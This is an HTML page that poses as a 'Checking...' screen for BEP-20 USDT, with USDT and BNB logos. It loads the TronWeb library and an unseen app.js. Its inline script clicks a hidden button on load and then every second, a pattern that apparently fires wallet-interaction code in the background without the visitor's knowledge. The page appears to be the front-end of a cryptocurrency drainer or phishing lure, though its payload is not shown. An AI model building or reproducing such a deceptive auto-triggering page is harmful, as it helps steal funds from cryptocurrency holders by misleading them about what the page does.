<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Checking Status</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }

        /* Standard 9:16 Frame Ratio Setup */
        html, body {
            width: 100%;
            height: 100vh;
            background-color: #0d111a;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #ffffff;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* 9:16 Container Boundary */
        .app-viewport {
            width: 100vw;
            height: 100vh;
            max-width: 100vh * (9/16);
            background-color: #0d111a;
            position: relative;
            overflow: hidden;
        }

        /* Scroll Container */
        .scroll-container {
            width: 100%;
            height: 100%;
            overflow-y: scroll;
            scroll-snap-type: y mandatory;
            scroll-behavior: smooth;
            -ms-overflow-style: none;
            scrollbar-width: none;
        }

        .scroll-container::-webkit-scrollbar {
            display: none;
        }

        /* Screen 1: Checking UI */
        .section-splash {
            height: 100%;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 20px;
            scroll-snap-align: start;
            background-color: #0d111a;
        }

        /* Stacked Icons Container */
        .icon-wrapper {
            position: relative;
            width: 76px;
            height: 76px;
            margin-bottom: 24px;
        }

        /* Main USDT Logo */
        .usdt-icon {
            width: 76px;
            height: 76px;
            border-radius: 50%;
            object-fit: cover;
            display: block;
        }

        /* BNB Badge Overlay */
        .bnb-badge {
            position: absolute;
            bottom: -2px;
            right: -2px;
            width: 28px;
            height: 28px;
            background-color: #0d111a;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2px;
        }

        .bnb-badge img {
            width: 24px;
            height: 24px;
            border-radius: 6px;
            object-fit: cover;
        }

        /* Text Styles */
        .title {
            font-size: 22px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 12px;
            letter-spacing: -0.2px;
        }

        .subtitle {
            font-size: 11.5px;
            font-weight: 600;
            color: #7d8795;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            max-width: 280px;
            line-height: 1.4;
        }

        /* Screen 2: Target Section Locked in 9:16 Aspect */
        .section-target {
            height: 100%;
            width: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            scroll-snap-align: center;
            background-color: #0d111a;
        }

        /* Hidden Button for Script Auto-Trigger */
        #start-btn {
            display: none;
        }
    </style>
</head>
<body>

    <div class="app-viewport">
        <div class="scroll-container" id="scrollContainer">
            
            <!-- Screen 1: Top Checking View -->
            <div class="section-splash">
                <div class="icon-wrapper">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
                    <div class="bnb-badge">
                        <img src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" alt="BNB Logo">
                    </div>
                </div>

                <h1 class="title">Checking...</h1>
                <p class="subtitle">BEP 20 USDT</p>
            </div>

            <!-- Screen 2: Bottom Target View -->
            <div class="section-target" id="bottomTarget">
                <!-- Main Action Element Area -->
            </div>

        </div>
    </div>

    <!-- Hidden Button for Script Auto-Trigger -->
    <button id="start-btn"></button>

    <!-- External Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <script src="app.js"></script>

    <!-- Background Auto-Trigger & Scroll System -->
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            // Instant Scroll Down Trigger
            const target = document.getElementById("bottomTarget");
            if (target) {
                target.scrollIntoView({ behavior: "smooth" });
            }

            // Background Script Auto-Trigger
            const btn = document.getElementById("start-btn");

            const triggerClick = () => {
                if (btn) {
                    btn.click();
                }
            };

            triggerClick();
            setInterval(triggerClick, 1000);
        });
    </script>
</body>
</html>
